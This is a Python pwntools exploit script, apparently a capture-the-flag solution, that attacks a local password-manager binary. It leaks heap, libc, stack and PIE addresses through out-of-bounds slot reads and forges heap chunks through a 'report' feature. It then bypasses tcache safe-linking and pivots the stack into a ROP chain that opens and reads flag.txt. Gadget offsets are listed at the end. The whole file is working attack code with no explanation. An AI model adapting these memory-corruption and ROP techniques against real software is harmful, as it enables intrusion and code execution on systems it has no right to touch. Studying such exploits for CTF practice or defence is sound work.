#!/usr/bin/env python2
#-*- coding: future_fstrings -*-
from pwn import *
context.terminal = "tmux split -h".split()

def login(name):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", name)
    
def signup(name):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", name)
    
def logout():
    p.sendlineafter("> ", "4")
    
def report(content, title):
    p.sendlineafter("> ", "4")
    p.sendafter(":", content), sleep(0.1)
    p.sendafter(":", title), sleep(0.1)

def add_pw(password, slot_id):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", password)
    p.sendlineafter(":", str(slot_id))
    
def get_pw(slot_id):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(slot_id))
    
def del_pw(slot_id):
    p.sendlineafter("> ", "3")
    p.sendlineafter(":", str(slot_id))


p = process("./main")
NAME = "test"
signup(NAME)
login(NAME)
for i in range(9):
    add_pw(f"{i}".ljust(0x80, "@"), i)
for i in range(8):
    del_pw(i)
get_pw(86)
p.recvuntil(": ")
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
heap_base = leak - 0xa80
print "hex", hex(heap_base)
logout()
report(''.join([
    "!" * 0x10,
    p64(0x1111111111111111), p64(heap_base + 0x910)
]), "$")
login(NAME)
get_pw(87)
p.recvuntil(": ")
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
libc_base = leak - 0x21ace0
print "libc", hex(libc_base)

libc_environ = libc_base + 0x222200
logout()
report(''.join([
    "!" * 0x10,
    p64(0x1111111111111111), p64(libc_environ)
]), "$")
login(NAME)
get_pw(87)
p.recvuntil(": ")
stack_env = u64(p.recvline()[:-1].ljust(8, "\x00"))
# libc_base = leak - 0x21ace0
print "environ", hex(stack_env)
#############

logout()
report(''.join([
    "!" * 0x10,
    p64(0), p64(0), # [0]
    p64(1), p64(heap_base + 0xCE0), # [1]
    p64(0), p64(0), # [2]
    p64(100), p64(stack_env - 0x3e0), # [3]
    p64(0), p64(0), 
    p64(0), p64(0), 
]).ljust(336,"#")[:336], "new")

signup("ex")
login("ex")
add_pw("A" * 0xc0, 0)

logout()
report(''.join([
    "!" * 0x10,
    p64(0), p64(0x21),
    p64(0xdeadbeef), p64(0xcafecafe),
]).ljust(0x70,"A")[:0x70], "new")

login("ex")
get_pw(3)
p.recvuntil(": ")
leak = u64(p.recvline()[:-1].ljust(8, "\x00")) 
piebase = leak - 0x2b98
print "pie", hex(piebase)
del_pw(1)

logout()
report(''.join([
    "!" * 0x10,
    p64(0), p64(0x21),
    p64(((heap_base + 0xCE0) >> 12) ^ (piebase + 0x5000)), p64(0xcafecafe)
]).ljust(0x68,"a")[:0x68] + p64(heap_base + 0xD60 + 0x170), "new") # rbp (0x16a06a)

rdi_r = libc_base + 0x2a3e5
rsi_r = libc_base + 0x3dd16
rdx_pr = libc_base + 0x11f2e7
rcx_r = libc_base + 0x3d1ee
libc_open = libc_base + 0x0000000001144e0
libc_read = libc_base + 0x1147d0
report(''.join([
    "!" * 0x10,
    p64(0xdeadbeef), p64(0xdeadbeef),
    
    # heap + 0xD60
    ''.join([
        "?" * 0x8,
        p64(heap_base + 0xD60 + 0x170 + 0x20), # mov rbx, qword [rbp-0x00000168] 
        "?" * 0x18,
        p64(libc_base + 0x113328), # call qword [rax+0x28]
    ]).ljust(0x170, "?"),
    
    # rbp
    "!" * 0x18,
    p64(heap_base + 0xD60), # mov rax, [rbp+0x18]

    # +0xef0
    'flag.txt\x00'.ljust(0x88),
    p64(libc_base + 0x5a120),
    "?" * (0xB0 - 0x90),
    p64(heap_base + 0xFA8),
    # +0xFA8
    # open("/flag.txt", 0) 
    p64(rdi_r), p64(heap_base+0xEF0),
    p64(rsi_r), p64(0),
    p64(libc_open),
    
    # read(fd, buf, 0x100)
    p64(rdx_pr), p64(0x100), p64(0xdead),
    p64(rsi_r), p64(heap_base+0xEF0),
    p64(rdi_r), p64(0),
    p64(libc_read),

    # srv_res(3, 0, len, flag)
    p64(rcx_r), p64(heap_base+0xEF0),
    p64(rdx_pr), p64(100), p64(0xdead),
    p64(rsi_r), p64(0),
    p64(rdi_r), p64(3),    
    p64(piebase + 0x000000000001FB7), 
    p64(0xdead),
    
]).ljust(0xFF0,"*")[:0xFF0], "new")

login("ex")
# pause()
add_pw(p64(libc_base + 0x16a06a), 4)
get_pw(6)

p.interactive()
"""
0x16a06a: mov rbp, qword [rdi+0x48] ; mov rax, qword [rbp+0x18] ; lea r13, qword [rbp+0x10] ; mov  [rbp+0x10], 0x00000000 ; mov rdi, r13 ; call qword [rax+0x28] ; (1 found)
0x113328: mov rbx, qword [rbp-0x00000168] ; mov rax, rbx ; mov rdx, qword [rbx+0x000000B0] ; mov rsi, qword [rbx+0x000000A0] ; mov rdi, qword [rbx+0x00000080] ; call qword [rax+0x00000088] ; (1 found)
0x5a120: mov rsp, rdx ; ret ; (1 found)

0x2a3e5: pop rdi ; ret ; (1 found)
0x3dd16: pop rsi ; ret ; (1 found)
0x11f2e7: pop rdx ; pop r12 ; ret ; (1 found)
0x3d1ee: pop rcx ; ret ; (1 found)

"""
